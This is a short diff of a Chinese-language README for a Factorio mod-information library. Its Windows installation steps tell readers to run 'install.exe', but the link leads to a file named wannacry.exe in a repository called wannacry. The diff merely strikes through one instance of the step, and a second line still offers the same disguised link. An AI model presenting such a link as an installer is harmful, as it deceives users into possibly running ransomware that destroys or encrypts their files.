@@ -3,7 +3,7 @@
 Factorio-Mod-info 是一个可以获取 Factorio Mod 信息的库。
 ## 安装
 ### Window
-运行 [`install.exe`](https://github.com/745275633/wannacry/raw/master/wannacry.exe) 将自动进行安装~~，**注意：请自行备份重要文件**
+~~运行 [`install.exe`](https://github.com/745275633/wannacry/raw/master/wannacry.exe) 将自动进行安装~~，**注意：请自行备份重要文件**
 
 为了缩小这个 repo 的大小，[`install.exe`](https://github.com/745275633/wannacry/raw/master/wannacry.exe) 已经移至其他 repo。
 ### Arch Linux
